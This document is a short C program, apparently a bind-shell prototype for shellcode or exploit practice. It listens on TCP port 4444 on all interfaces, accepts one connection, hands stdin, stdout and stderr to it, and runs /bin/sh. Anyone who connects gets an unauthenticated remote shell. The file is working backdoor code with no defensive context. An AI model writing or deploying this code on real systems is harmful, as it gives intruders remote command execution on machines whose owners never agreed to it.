#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

int main(int argc, char *argv[]){
	
	// AF_INET = 2;		SOCK_STREAM = 1
	int fd = 0;
	int connfd = 0;
	fd = socket(AF_INET, SOCK_STREAM, 0);
		
	struct sockaddr_in serv_addr; 
	serv_addr.sin_family = AF_INET;
    	serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    	serv_addr.sin_port = htons(4444); 

	bind(fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)); 
	listen(fd, 0);

	connfd = accept(fd, (struct sockaddr*)NULL, NULL);

	// redirect stdin, stdout, stderr
	dup2(connfd, 0);
	dup2(connfd, 1);
	dup2(connfd, 2); 

	// run program
	execve("/bin/sh", NULL, NULL);
	
}
